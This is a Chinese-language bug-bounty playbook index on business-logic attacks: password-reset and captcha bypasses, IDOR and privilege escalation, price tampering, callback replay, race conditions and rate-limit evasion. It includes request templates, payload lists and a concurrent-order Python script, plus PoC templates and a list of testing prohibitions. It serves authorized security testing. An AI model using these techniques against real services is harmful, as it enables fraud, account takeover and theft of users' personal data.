# 业务逻辑 / 越权 / 验证码 / 支付 / CSRF / 点击劫持 — 决策索引

> 视角:**业务流程层**漏洞。这类不靠 payload,靠"想到对方该做但没做的检查"。本文件是入口路由 + 通用execution-framework(含 wooyun 22 案例的密码重置 4 模式 + 验证码 20 案例)。

---

## 子文件路由(Phase 4 读哪一份?)

| 入口信号 | MUST Read |
|---|---|
| 表单 POST 无 CSRF token / Cookie SameSite 缺失 / `Origin`/`Referer` 校验弱 | `10-csrf.md` |
| 用户态 ID 可遍历 / 支付金额可改 / 密码重置流程多步骤 / 验证码可重放 / 优惠券双花 / 余额 | `11-business-logic.md` |
| 整数溢出 / 浮点精度 / 订阅层级混淆 / 对象状态操纵 / Zip 炸弹 / CSV 注入 | `11-business-logic.md`（后半新增） |
| 敏感操作页可被 iframe 嵌套 / `X-Frame-Options` 缺失 | `12-clickjacking.md` |

---


> 视角：黑盒，关注流程、状态机、不变量

## 1. 一句话说清

逻辑漏洞 = 程序按预期工作，但**预期不对**。
不是注入、不是 RCE，没有"特定 payload"，靠的是**流程理解 + 篡改 + 重放**。
渗透价值：**很难被 WAF 检测**，大型企业常因业务复杂而暴露。

---

## 2. 高频入口点（按 WooYun 8,292 案例归类）

| 类型 | 入口特征 | 关键参数 |
|------|---------|---------|
| 密码重置 | `/reset`、`/forgot`、`/findpwd`、`/sms` | `phone`、`username`、`code`、`token`、`step` |
| 越权 | `/user/{id}`、`/order/{id}` | `id`、`uid`、`oid`、`addrid`、`hotelid` |
| 角色 / 提权 | `/role`、`/permission`、`/profile` | `role`、`aid`、`isAdmin`、`level` |
| 支付 / 订单 | `/order/create`、`/pay`、`/checkout` | `price`、`amount`、`total`、`count`、`couponCode` |
| 验证码 | `/sendSms`、`/captcha`、`/verify` | `code`、`captcha`、`smsCode` |
| 优惠券 / 积分 | `/coupon`、`/exchange`、`/redeem` | `code`、`couponId`、`points` |

---

## 3. 探测手法（按子类分）

### 3.1 密码重置 4 模式（来自 wooyun 22 案例）

#### 模式 A：验证码回显在响应

```http
POST /api/sendSmsCode HTTP/1.1
phone=13888888888

→ 响应：
{"code":0,"data":{"verifyCode":"123456"}}
```

**探针**：抓发送验证码的响应包，搜 `verifyCode`、`smsCode`、`code`、`captcha`。
案例：某停车 APP、某社区平台、某邮箱（wooyun-2015-0134914）。

#### 模式 B：验证码与用户解绑

```
1. 用攻击者自己手机 138xxxx0001 注册，收到 code=123456
2. 对受害者发起重置 phone=victim
3. 提交重置表单 phone=victim, code=123456 → 通过
```

**探针**：让平台给 A 手机发码，然后用 A 收到的码去验证 B 手机。
案例：某记账 APP（影响 8000W 用户）。

#### 模式 C：流程跳跃

正常 4 步：输入账号 → 验证身份 → 重置密码 → 完成。

**探针**：直接 GET / POST 第 3 步页面 URL；或用 Burp 改前端流程状态。

```
1. 走完正常流程一次，记录每一步 URL
2. 直接发起第 3 步请求 / 看到达第 3 步是否需要前置 token
3. 修改前端 DOM：用 F12 把"重置密码"DOM 替换"身份验证"
```

案例：某户外用品商城（wooyun-2014-054890）。

#### 模式 D：凭证参数可控

```http
POST /resetPassword HTTP/1.1
username=victim&newPassword=hacked123
```

**探针**：提交时改请求体里的用户名 / token / userId 字段。
看是否真的把 `victim` 的密码改了（用受害者账号尝试登录新密码）。

### 3.2 越权（IDOR）

#### 水平越权（同级用户）

```http
# A 自己的资源
GET /api/address/edit/?addid=100001

# 改成 B 的
GET /api/address/edit/?addid=100002
```

**探针**：
1. 用账号 A 操作，记下 ID
2. 用账号 B 重发同一请求，把 ID 换成 A 的
3. 200 + 返回 A 的数据 = IDOR

工具：Burp `Autorize` 插件，自动比较两个 session 的响应。

参考案例：wooyun-2015-0119942（某商城 20W+ 用户）、wooyun-2014（一嗨租车 19W 发票）。

#### 垂直越权（普通 → 管理员）

```http
# 普通用户改自己records
POST /updateUser HTTP/1.1
user.aid=3&user.name=test

# 改成管理员 ID
POST /updateUser HTTP/1.1
user.aid=1&user.name=test
```

**探针**：
1. 注册两个账号：普通 + 管理员（用平台 demo / 自己测）
2. 抓管理员页面的接口
3. 用普通用户 token 直接调
4. 200 + 操作成功 = 提权

枚举角色 ID：通常 `1=超管, 2=管理员, 3=普通用户`。

#### Header / Cookie 注入越权

```
X-User-Role: admin
X-User-Id: 1
X-Original-User: admin
X-Forwarded-User: admin
Cookie: role=admin; isAdmin=1; userId=1
```

某些系统把 Header / Cookie 直接当身份信息——**逐个加上面 header 重发**。

#### IDOR 测试矩阵

| 操作 | 探针 | 风险 |
|------|------|------|
| 读 | 改 ID 查他人资源 | 中 / 高 |
| 改 | 改 ID 改他人资源 | 高 |
| 删 | 改 ID 删他人资源 | 严重（不可逆，禁实测删除！） |
| 创建 | 改 owner 字段 | 高 |

### 3.3 验证码绕过（20 案例）

#### 不刷新 / 可重用

```python
# 同一验证码用多次
captcha = "ABCD"
for password in wordlist:
    r = login(username, password, captcha)
    if "success" in r.text: break
```

**探针**：连续登录失败 5 次，验证码图片不变 → 可固定值爆破密码。

#### 4–6 位纯数字 + 无频率限制

```
sms code = 4-6 digit numeric
no throttle
→ Burp Intruder 100 线程爆破
```

参考：某品牌商城 APP 5 位数字验证码 30 秒爆完。

#### 客户端验证 / 响应篡改

```
# 服务端返回
{"status":"0","msg":"验证码错误"}

# 改成
{"status":"1","msg":"成功"}
→ 客户端进入下一步
```

**探针**：在 Burp 拦响应包，把 `0/false/error` 改成 `1/true/success`。
适用：`status` 控制下一步流程的 SPA。

参考案例：健一网 APP（wooyun-2015-0139590）、你我金融。

### 3.4 支付 / 订单（9 案例）

#### 价格篡改

```http
POST /order/create HTTP/1.1
{"productId":"12345","quantity":1,"price":0.01}

# 原价 299，提交 0.01 → 服务端不重算 → 0.01 元购入
```

**探针清单**（每个值都试）：
```
price = 0
price = 0.01
price = -100
price = 1e-10
price = "0.01"      # 字符串
price = null
price = {"$gt":0}   # MongoDB 注入
price = [299,0.01]  # 数组
```

#### 数量篡改

```
count = -1            # 负数 → 退款逻辑被反向触发
count = 0             # 免费下单
count = 9999999999    # 整数溢出
```

#### 优惠券滥用 / 撤销

```
1. 下满减组合订单（A 商品 59 元 + 换购 B 商品 5.9 元）
2. 支付后取消 A 商品
3. 实际以 5.9 元购得原价 21 元的 B
```

#### 重放支付回调

```http
# 三方支付回调
POST /pay/notify
sign=xxx&order_id=123&status=success&amount=100

# 重放同一回调（同 sign）
→ 如果服务端不查询 order 状态，可能多次发货
```

#### 并发竞争

```python
# 同时创建 50 个 0.01 元订单
import threading
def create():
    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
threads = [threading.Thread(target=create) for _ in range(50)]
[t.start() for t in threads]
```

#### 参数污染

```
POST /order/create?price=299.00&price=0.01
POST /order/create  body: price[]=299.00&price[]=0.01
```

参考案例：wooyun-2015-0108817（某电商价格篡改）、中国才储、春趣商城。

### 3.5 竞态条件（race）

| 场景 | 探针 |
|------|------|
| 优惠券双花 | 并发 50 次同一 coupon code |
| 余额超扣 | 并发提现 / 转账，初始余额 100，每次提 100 |
| 邀请奖励刷量 | 并发注册新用户 + 邀请码 |
| 验证码爆破 | 并发提交不同 code |
| 限购抢购 | 并发下单 |
| 唯一性破坏 | 并发注册同一用户名（`existsByUsername` 之后再 insert，竞态可双注册） |

工具：
- Burp Suite Intruder（"Send N requests in parallel"）
- Turbo Intruder（精确并发）
- 自写 Python `threading` / Go goroutine

参考：详见 `playbooks/race-conditions.md`。

---

## 4. Bypass 矩阵

| 拦截 | 绕过 |
|------|------|
| 单 IP 频率限制 | 多 IP / 代理池 / X-Forwarded-For 注入 |
| 同一手机号频率 | 在号码后加点（`13888888888.`、`+8613888888888`、`013888888888`） |
| 验证码图形 | 调验证码识别 API（仅自测合规情况下） |
| 同一账号操作 | 注册多账号轮询 |
| 时间限制 | 改 `Date` Header（少数系统采信） / 调时区参数 |
| Token 一次性 | 抓发包前后 token，看是否真的失效 |

---

## 5. 利用提权 / 横向

| 起点 | 终点 |
|------|------|
| 密码重置漏洞 | 接管所有用户（H1 中位 $2k–$10k） |
| 水平 IDOR 大数据 | PII 泄露（每条 PII = $1–$5 黑市价） |
| 垂直 IDOR | 提权到管理员 → 后台所有功能 → P0 |
| 支付 0.01 元 | 实物商品 / 会员服务 / 虚拟币 |
| 验证码爆破 | 任意账号接管 |
| 重放回调 | 多次发货 / 多次充值 |
| 竞态优惠券 | 反复使用同一优惠 |

---

## 6. 真实案例指纹

| 漏洞类型 | wooyun ID / 案例 | 指纹 / 一句话 |
|---------|----------------|------------|
| 验证码回显 | 某停车 APP wooyun-2015-0134914 | 响应包含 `verifyCode` / `smsCode` |
| 重置流程跳过 | 某户外用品商城 wooyun-2014-054890 | 直接访问第 3 步 URL 不验证前置 |
| 水平越权 | 某成人用品商城 wooyun-2015-0119942 | `?id=` 改成他人 ID 200 |
| 垂直越权 | 浙江在线 wooyun-2015-099378 | `user.aid=1` 提权超管 |
| 金额篡改 | 中国才储 wooyun-2012-07745 | `price=0.01` 通过支付 |
| 价格参数 | 某电商 wooyun-2015-0108817 | 客户端提交 price，服务端不重算 |
| 撞库 | 某手机厂商论坛 wooyun-2014-061871 | 8W 弱口令，无频率限制 |
| Cookie 伪造 | 福建网龙 wooyun-2015-0157092 | `?userAccount=admin` 直接写 Cookie |
| 响应篡改 | 健一网 wooyun-2015-0139590 | 改返回 `status=1` 进入下一步 |

---

## 7. 复现 / 证据要点

### 7.1 IDOR 报告必备

1. 两个账号：A（攻击者）+ B（受害者，**实际为研究员的另一个测试账号**）
2. A 的合法请求包 + 200
3. A 改成 B 的 ID 的请求包 + 200 + 含 B 的数据
4. 如果用真实第三方账号测试到了，**立即停止 + 不在报告中放任何真实数据 + 主动声明**

### 7.2 越权 PoC 模板

```markdown
# 复现步骤

## 账号准备
- 账号 A：用户名 hunter_a，user_id=10001（攻击者控制）
- 账号 B：用户名 hunter_b，user_id=10002（攻击者控制，仅用于证明 IDOR）

## Step 1：A 查询自己订单（基线）
GET /api/orders/100  Authorization: A_token  → 200，返回 A 的订单
（请求/响应见附件 1）

## Step 2：A 查询 B 的订单（漏洞证明）
GET /api/orders/200  Authorization: A_token  → 200，返回 B 的订单内容
（请求/响应见附件 2）

## Step 3：用 C（陌生 user_id=99999）证明非测试账号也可遍历
GET /api/orders/99999  Authorization: A_token  → 200，含订单号、收货人、电话（已脱敏）
仅取 1 条样本，未尝试遍历更多。
```

### 7.3 价格篡改 PoC 模板

```
1. 商品页：299 元
2. 提交订单时改 price=0.01：
   POST /order/create
   {"productId":"X","quantity":1,"price":0.01}
3. 服务端响应订单总额 = 0.01 元
4. 实际支付页面也是 0.01 元（截图 + 支付平台订单截图）
5. 收到商品 / 服务（如果是数字商品则看激活页面）
```

### 7.4 CVSS 参考

```
垂直越权 → 提权 admin     CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
水平越权 → 读他人 PII     CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5
密码重置接管             CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
价格篡改 0.01            CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N = 6.5（按业务影响升降）
验证码爆破登录           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
```

### 7.5 影响段（强调业务影响）

```
本漏洞允许任意普通用户通过修改 user_id 参数读取/修改他人订单数据。
对平台业务的实际影响：
1. 用户 PII 泄露：订单含姓名、收货地址、电话、邮箱（GDPR/CCPA 风险）；
2. 商业秘密：订单金额、商品偏好等用户画像数据；
3. 信任损害：被恶意修改地址可导致物流诈骗。

测试时使用了攻击者控制的两个账号 A、B，未访问任何真实用户订单。
仅在最后一步用 1 个随机 ID 证明可遍历性，立即停止并已脱敏。
```

---

## 8. 不要做的事

- **禁**：用支付篡改实际下单实物商品（即使 0.01 元也不行）。改用：
  - 测试环境（如有）
  - 数字商品（电子卡券，支付后立即截图，**不激活**）
  - 演示到"订单生成 + 金额异常"即停，不进入支付链路
- **禁**：批量 IDOR 拖库。最多 1–3 条样本，且全部脱敏。
- **禁**：用密码重置漏洞重置真实用户密码。重置自己的两个测试账号即可。
- **禁**：用越权账号执行写 / 删 / 改操作。只读证明。
- **禁**：撞库使用 SRC 平台之外的真实数据库（违反法律）。
- **禁**：竞态测试发起 1000+ rps（视为 DoS）。控制 50–100 并发即可证明。
- **报告中不要包含**：他人 PII 原文、订单号、手机号、地址（一律脱敏到只剩前 2 + 后 2 字符）。

## H1 真实案例

_共 234 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 + 投票×100) 排序取 Top 12_

| Severity | $ | 程序 | 标题（点击看原报告） | 摘要 |
|---|--:|---|---|---|
| Critical | 7500 usd | Valve | [Modify in-flight data to payment provider Smart2Pay](https://hackerone.com/reports/1295844) | I have found vulnerability which allows attacker to generate steam wallet balance |
| Critical | — | BlockDev Sp. Z o.o | [Steal ALL collateral during liquidation by exploiting lack of validation in `flip.kick`](https://hackerone.com/reports/684092) | Summary: The `flip` contract allows for the MCD system to auction collateral in exchange for DAI |
| Critical | 12000 usd | GitLab | [An attacker can run pipeline jobs as arbitrary user](https://hackerone.com/reports/894569) | Summary An attacker can run arbitrary pipeline jobs as a `victim` user |
| Critical | 10000 usd | Coinbase | [Double Payout via PayPal](https://hackerone.com/reports/307239) | Double Payout via PayPal |
| High | — | TikTok | [[CSRF] TikTok Careers Portal Account Takeover](https://hackerone.com/reports/1010522) | [CSRF] TikTok Careers Portal Account Takeover |
| Critical | — | GitLab | [Bypass of GitLab CI runner slash fix in YAML validation](https://hackerone.com/reports/409395) | Hi Gitlab Security, I notice the bug #301432 that Jobert reported earlier is could be bypassed by setting variable in environment |
| High | 3500 usd | GitLab | [Cross-site Scripting (XSS) - Stored in RDoc wiki pages](https://hackerone.com/reports/662287) | Summary When creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanit… |
| High | — | pixiv | [Reset any password](https://hackerone.com/reports/703972) | Summary: When I try to reset the password, the verification code of the mailbox is 6 digits, and there is no limit on the numbe… |
| High | — | Reverb.com | [Race Condition allows to redeem multiple times gift cards which leads to free "money"](https://hackerone.com/reports/759247) | Hello team! I've found a Race Condition vulnerability which allows to redeem gift cards multiple times. This how a s/he can eas… |
| Critical | — | Coinbase | [Ethereum account balance manipulation](https://hackerone.com/reports/300748) | Ethereum account balance manipulation |
| High | — | Semrush | [An attacker can buy marketplace articles for lower prices as it allows for negative quantity valu…](https://hackerone.com/reports/771694) | Hi there, When we Summary:** When someone goes to https://www.semrush.com/marketplace/offers/ and orders for articles, an attac… |
| Critical | 2000 usd | inDrive | [Change phone number OTP flaw leads to any phone number takeover](https://hackerone.com/reports/2588329) | Summary: Dear Indrive, Ive found another valid report, the app allows any user to change the app phone number, but a flaw withi… |

**命中本类的 weakness 分布：**

- Business Logic Errors：64 条
- Cross-Site Request Forgery (CSRF)：59 条
- Violation of Secure Design Principles：32 条
- Improper Input Validation：21 条
- Improper Restriction of Authentication Attempts：17 条
- Modification of Assumed-Immutable Data (MAID)：9 条
- UI Redressing (Clickjacking)：8 条
- Uncategorized → 手工归类：7 条
- Client-Side Enforcement of Server-Side Security：4 条
- Weak Password Recovery Mechanism for Forgotten Password：4 条
- User Interface (UI) Misrepresentation of Critical Information：2 条
- External Control of Critical State Data：2 条
- Improper Initialization：1 条
- Exposure of Data Element to Wrong Session：1 条
- Encoding Error：1 条
- Improper Check or Handling of Exceptional Conditions：1 条
- Improper Handling of URL Encoding (Hex Encoding)：1 条



---

完整 Payload 库见同级子文件。
